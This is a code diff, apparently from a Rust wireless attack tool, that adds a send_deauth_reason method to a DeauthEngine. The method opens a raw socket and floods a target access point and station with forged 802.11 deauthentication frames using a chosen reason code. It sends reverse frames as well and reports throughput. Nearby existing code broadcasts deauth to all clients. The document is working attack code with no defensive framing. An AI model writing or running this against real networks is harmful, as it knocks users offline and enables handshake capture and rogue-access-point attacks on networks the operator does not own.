@@ -158,6 +158,45 @@ impl DeauthEngine {
         })
     }
 
+    /// Deauth using one fixed reason code for every frame.
+    pub fn send_deauth_reason(&self, bssid: &str, station: &str, count: u32, reason: u8) -> Value {
+        let (Some(b), Some(s)) = (parse_mac(bssid), parse_mac(station)) else {
+            return json!({"error": "invalid MAC address", "sent": 0});
+        };
+        let sock = match RawSocket::open(&self.interface) {
+            Ok(s) => s,
+            Err(e) => return json!({"error": e.to_string(), "sent": 0}),
+        };
+        let started = Instant::now();
+        let mut sent = 0u64;
+        let mut seq = 0u16;
+        for _ in 0..count {
+            if !self.running.load(Ordering::SeqCst) {
+                break;
+            }
+            let frame = deauth_frame(&b, &s, reason, seq);
+            if sock.send(&frame).is_ok() {
+                sent += 1;
+            }
+            if s != [0xFF; 6] {
+                let reverse = deauth_frame(&s, &b, reason, seq + 1);
+                if sock.send(&reverse).is_ok() {
+                    sent += 1;
+                }
+            }
+            seq = seq.wrapping_add(2);
+            thread::sleep(Duration::from_micros(1_000_000 / self.packet_rate as u64));
+        }
+        self.packets_sent.fetch_add(sent, Ordering::Relaxed);
+        let elapsed = started.elapsed().as_secs_f64();
+        json!({
+            "sent": sent,
+            "reason": reason,
+            "elapsed_s": (elapsed * 1000.0).round() / 1000.0,
+            "pps": if elapsed > 0.0 { (sent as f64 / elapsed).round() } else { 0.0 }
+        })
+    }
+
     pub fn broadcast_deauth(&self, bssid: &str, count: u32) -> Value {
         self.send_deauth(bssid, "ff:ff:ff:ff:ff:ff", count)
     }
